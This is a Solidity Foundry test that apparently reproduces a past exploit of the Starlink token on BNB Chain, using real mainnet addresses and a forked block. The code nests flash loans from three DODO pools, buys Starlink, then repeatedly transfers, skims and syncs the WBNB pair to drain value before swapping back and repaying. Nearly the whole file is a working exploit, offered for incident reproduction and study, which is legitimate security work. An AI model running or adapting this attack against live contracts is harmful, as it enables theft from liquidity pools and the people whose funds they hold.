// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/NumenAlert/status/1626447469361102850
// https://twitter.com/bbbb/status/1626392605264351235
// @TX
// https://bscscan.com/tx/0x146586f05a4513136deab3557ad15df8f77ffbcdbd0dd0724bc66dbeab98a962

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 Starlink = IERC20(0x518281F34dbf5B76e6cdd3908a6972E8EC49e345);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x425444dA1410940CFdfB6A980Bd16aA7a5376d6D);
    address dodo1 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address dodo2 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    uint256 dodoFlashAmount1;
    uint256 dodoFlashAmount2;
    uint256 dodoFlashAmount3;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 25_729_304);
    }

    function testExploit() public {
        dodoFlashAmount1 = WBNB.balanceOf(dodo1);
        DVM(dodo1).flashLoan(dodoFlashAmount1, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            dodoFlashAmount2 = WBNB.balanceOf(dodo2);
            DVM(dodo2).flashLoan(dodoFlashAmount2, 0, address(this), new bytes(1));
            WBNB.transfer(dodo1, dodoFlashAmount1);
        } else if (msg.sender == dodo2) {
            dodoFlashAmount3 = WBNB.balanceOf(dodo3);
            DVM(dodo3).flashLoan(dodoFlashAmount3, 0, address(this), new bytes(1));
            WBNB.transfer(dodo2, dodoFlashAmount2);
        } else if (msg.sender == dodo3) {
            WBNBToStarlink();
            while (Starlink.balanceOf(address(Pair)) > 1000) {
                Starlink.transfer(address(Pair), Starlink.balanceOf(address(Pair)));
                Pair.skim(address(this));
                Pair.sync();
            }
            StarlinkToWBNB();
            WBNB.transfer(dodo3, dodoFlashAmount3);
        }
    }

    function WBNBToStarlink() internal {
        uint256 amountIn = WBNB.balanceOf(address(this));
        WBNB.transfer(address(Pair), WBNB.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(Starlink);
        uint256[] memory values = Router.getAmountsOut(amountIn, path);
        values[1] = Starlink.balanceOf(address(Pair)) * 51 / 100;
        Pair.swap(values[1], 0, address(this), "");
    }

    function StarlinkToWBNB() internal {
        Starlink.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(Starlink);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Starlink.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp
        );
    }
}
